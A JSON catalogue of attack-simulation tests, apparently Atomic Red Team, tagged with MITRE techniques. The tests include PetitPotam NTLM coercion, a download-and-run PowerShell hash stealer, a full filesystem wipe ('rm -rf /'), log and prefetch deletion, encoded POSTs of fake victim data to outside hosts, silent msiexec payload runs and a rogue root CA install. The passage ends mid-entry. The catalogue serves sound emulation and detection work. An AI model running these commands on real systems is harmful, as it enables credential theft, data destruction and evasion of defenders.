[
	{
		"name": "PetitPotam",
		"auto_generated_guid": "485ce873-2e65-4706-9c7e-ae3ab9e14213",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"captureServerIP": {
				"description": "Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)",
				"type": "string",
				"default": "10.0.0.3"
			},
			"targetServerIP": {
				"description": "Computer IP to force authentication from (ex. domain controller)",
				"type": "string",
				"default": "10.0.0.2"
			},
			"efsApi": {
				"description": "EFS API to use to coerce authentication",
				"type": "integer",
				"default": 1
			},
			"petitpotam_path": {
				"description": "PetitPotam Windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
				"prereq_command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true\" -OutFile \"#{petitpotam_path}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n"
		},
		"attack_technique": "T1187",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS",
		"auto_generated_guid": "7f06b25c-799e-40f1-89db-999c9cc84317",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1187",
		"phases": ["credential-access"]
	},
	{
		"name": "Trigger an authenticated RPC call to a target server with no Sign flag set",
		"auto_generated_guid": "81cfdd7f-1f41-4cc5-9845-bb5149438e37",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"custom_port": {
				"description": "Specify the custom port number",
				"type": "integer",
				"default": "9997"
			},
			"server_ip": {
				"description": "Specify the server IP address. If not specified, the loop back IP will be used",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1187",
		"phases": ["credential-access"]
	},
	{
		"name": "Delete a single file - FreeBSD/Linux/macOS",
		"auto_generated_guid": "562d737f-2fc6-4b09-8c2a-7f8ff0828480",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"parent_folder": {
				"description": "Path of parent folder",
				"type": "path",
				"default": "/tmp/victim-files/"
			},
			"file_to_delete": {
				"description": "Path of file to delete",
				"type": "path",
				"default": "/tmp/victim-files/T1070.004-test.txt"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The file must exist in order to be deleted\n",
				"prereq_command": "test -e #{file_to_delete} && exit 0 || exit 1\n",
				"get_prereq_command": "mkdir -p #{parent_folder} && touch #{file_to_delete}\n"
			}
		],
		"executor": {
			"command": "rm -f #{file_to_delete}\n",
			"cleanup_command": "rm -rf #{parent_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete an entire folder - FreeBSD/Linux/macOS",
		"auto_generated_guid": "a415f17e-ce8d-4ce2-a8b4-83b674e7017e",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"folder_to_delete": {
				"description": "Path of folder to delete",
				"type": "path",
				"default": "/tmp/victim-folder"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The folder must exist in order to be deleted\n",
				"prereq_command": "test -e #{folder_to_delete} && exit 0 || exit 1\n",
				"get_prereq_command": "mkdir -p #{folder_to_delete}\n"
			}
		],
		"executor": {
			"command": "rm -rf #{folder_to_delete}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Overwrite and delete a file with shred",
		"auto_generated_guid": "039b4b10-2900-404b-b67f-4b6d49aa6499",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"file_to_shred": {
				"description": "Path of file to shred",
				"type": "path",
				"default": "/tmp/victim-shred.txt"
			}
		},
		"executor": {
			"command": "shred -u #{file_to_shred}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete a single file - Windows cmd",
		"auto_generated_guid": "861ea0b4-708a-4d17-848d-186c9c7f17e3",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_delete": {
				"description": "File to delete. Run the prereq command to create it if it does not exist.",
				"type": "string",
				"default": "%temp%\\deleteme_T1551.004"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n",
				"prereq_command": "IF EXIST \"#{file_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "echo deleteme_T1551.004 >> #{file_to_delete}\n"
			}
		],
		"executor": {
			"command": "del /f #{file_to_delete}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete an entire folder - Windows cmd",
		"auto_generated_guid": "ded937c4-2add-42f7-9c2c-c742b7a98698",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"folder_to_delete": {
				"description": "Folder to delete. Run the prereq command to create it if it does not exist.",
				"type": "string",
				"default": "%temp%\\deleteme_T1551.004"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file to delete must exist on disk at specified location (#{folder_to_delete})\n",
				"prereq_command": "IF EXIST \"#{folder_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "mkdir #{folder_to_delete}\n"
			}
		],
		"executor": {
			"command": "rmdir /s /q #{folder_to_delete}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete a single file - Windows PowerShell",
		"auto_generated_guid": "9dee89bd-9a98-4c4f-9e2d-4256690b0e72",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_delete": {
				"description": "File to delete. Run the prereq command to create it if it does not exist.",
				"type": "string",
				"default": "$env:TEMP\\deleteme_T1551.004"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n",
				"prereq_command": "if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path #{file_to_delete} | Out-Null\n"
			}
		],
		"executor": {
			"command": "Remove-Item -path #{file_to_delete}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete an entire folder - Windows PowerShell",
		"auto_generated_guid": "edd779e4-a509-4cba-8dfa-a112543dbfb1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"folder_to_delete": {
				"description": "Folder to delete. Run the prereq command to create it if it does not exist.",
				"type": "string",
				"default": "$env:TEMP\\deleteme_folder_T1551.004"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The folder to delete must exist on disk at specified location (#{folder_to_delete})\n",
				"prereq_command": "if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Path #{folder_to_delete} -Type Directory | Out-Null\n"
			}
		],
		"executor": {
			"command": "Remove-Item -Path #{folder_to_delete} -Recurse\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete Filesystem - Linux",
		"auto_generated_guid": "f3aa95fe-4f10-4485-ad26-abf22a764c52",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "[ \"$(uname)\" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete Prefetch File",
		"auto_generated_guid": "36f96049-0ad7-4a5f-8418-460acaeb92fb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Delete TeamViewer Log Files",
		"auto_generated_guid": "69f50a5f-967c-4327-a5bb-e1a9a9983785",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"teamviewer_log_file": {
				"description": "Teamviewer log file to create and delete.",
				"type": "string",
				"default": "$env:TEMP\\TeamViewer_54.log"
			}
		},
		"executor": {
			"command": "New-Item -Path #{teamviewer_log_file} -Force | Out-Null\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1070.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Pad Binary to Change Hash - Linux/macOS dd",
		"auto_generated_guid": "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"file_to_pad": {
				"description": "Path of binary to be padded",
				"type": "path",
				"default": "/tmp/evil-binary"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
				"prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "cp /bin/ls #{file_to_pad}\n"
			}
		],
		"executor": {
			"command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes\ndd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data\n",
			"cleanup_command": "rm #{file_to_pad}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Pad Binary to Change Hash using truncate command - Linux/macOS",
		"auto_generated_guid": "e22a9e89-69c7-410f-a473-e6c212cd2292",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"file_to_pad": {
				"description": "Path of binary to be padded",
				"type": "path",
				"default": "/tmp/evil-binary"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
				"prereq_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "cp /bin/ls #{file_to_pad}\n"
			}
		],
		"executor": {
			"command": "truncate -s +1 #{file_to_pad} #adds a byte to the file size\n",
			"cleanup_command": "rm #{file_to_pad}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Base64 Encoded data.",
		"auto_generated_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"destination_url": {
				"description": "Destination URL to post encoded data.",
				"type": "url",
				"default": "redcanary.com"
			},
			"base64_data": {
				"description": "Encoded data to post using fake Social Security number 111-11-1111.",
				"type": "string",
				"default": "MTExLTExLTExMTE="
			}
		},
		"executor": {
			"command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1132.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Base64 Encoded data (freebsd)",
		"auto_generated_guid": "2d97c626-7652-449e-a986-b02d9051c298",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"destination_url": {
				"description": "Destination URL to post encoded data.",
				"type": "url",
				"default": "redcanary.com"
			},
			"base64_data": {
				"description": "Encoded data to post using fake Social Security number 111-11-1111.",
				"type": "string",
				"default": "MTExLTExLTExMTE="
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires curl\n",
				"prereq_command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
				"get_prereq_command": "pkg install -y curl\n"
			}
		],
		"executor": {
			"command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1132.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "XOR Encoded data.",
		"auto_generated_guid": "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"destination_url": {
				"description": "Destination URL to post encoded data.",
				"type": "url",
				"default": "example.com"
			},
			"plaintext": {
				"description": "Plain text mimicking victim data sent to C2 server.",
				"type": "string",
				"default": "Path\\n----\\nC:\\Users\\victim"
			},
			"key": {
				"description": "XOR key used for encoding the plaintext.",
				"type": "string",
				"default": "abcdefghijklmnopqrstuvwxyz123456"
			}
		},
		"executor": {
			"command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1132.001",
		"phases": ["command-and-control"]
	},
	{
		"name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
		"auto_generated_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			},
			"action": {
				"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "i"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute Local MSI file with embedded VBScript",
		"auto_generated_guid": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			},
			"action": {
				"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "i"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
		"auto_generated_guid": "628fa796-76c5-44c3-93aa-b9d8214fd568",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			},
			"action": {
				"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "i"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute Local MSI file with an embedded EXE",
		"auto_generated_guid": "ed3fa08a-ca18-4009-973e-03d13014d0e8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			},
			"action": {
				"description": "Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "i"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript",
		"auto_generated_guid": "882082f0-27c6-4eec-a43c-9aa80bccdb30",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi"
			},
			"action": {
				"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "Install"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript",
		"auto_generated_guid": "cf470d9a-58e7-43e5-b0d2-805dffc05576",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi"
			},
			"action": {
				"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "Install"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_VBScript.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL",
		"auto_generated_guid": "32eb3861-30da-4993-897a-42737152f5f8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi"
			},
			"action": {
				"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "Install"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_DLL.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE",
		"auto_generated_guid": "55080eb0-49ae-4f55-a440-4167b7974f79",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi"
			},
			"action": {
				"description": "Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n",
				"type": "string",
				"default": "Install"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSI file must exist on disk at specified location (#{msi_payload})\n",
				"prereq_command": "if (Test-Path \"#{msi_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{msi_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi\" -OutFile \"#{msi_payload}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL",
		"auto_generated_guid": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_payload": {
				"description": "DLL to execute that has an implemented DllRegisterServer function",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /y \"#{dll_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
		"auto_generated_guid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_payload": {
				"description": "DLL to execute that has an implemented DllUnregisterServer function",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
				"prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n"
			}
		],
		"executor": {
			"command": "#{msi_exe} /z \"#{dll_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Msiexec.exe - Execute Remote MSI file",
		"auto_generated_guid": "44a4bedf-ffe3-452e-bee4-6925ab125662",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"msi_payload": {
				"description": "MSI file to execute",
				"type": "string",
				"default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
			},
			"msi_exe": {
				"description": "MSIExec File Path",
				"type": "path",
				"default": "c:\\windows\\system32\\msiexec.exe"
			}
		},
		"executor": {
			"command": "#{msi_exe} /q /i \"#{msi_payload}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1218.007",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on CentOS/RHEL",
		"auto_generated_guid": "9c096ec4-fd42-419d-a762-d64cc950627e",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"cert_filename": {
				"description": "Path of the CA certificate we create",
				"type": "path",
				"default": "rootCA.crt"
			},
			"key_filename": {
				"description": "Key we create that is used to create the CA certificate",
				"type": "path",
				"default": "rootCA.key"
			}
		},
		"executor": {
			"command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n",
			"cleanup_command": "rm /etc/pki/ca-trust/source/anchors/#{cert_filename}\nupdate-ca-trust\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1553.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Install root CA on FreeBSD",
		"auto_generated_guid": "f4568003-1438-44ab-a234-b3252ea7e7a3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"cert_filename": {
				"description": "Path of the CA certificate we create",
				"type": "path",
				"default": "rootCA.crt"
			},
			"key_filename": {
				"description": "Key we create that is used to create the CA certificate",
				"type": "path",
				"default": "rootCA.key"
			}
		},
		"executor": {
			"command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n",
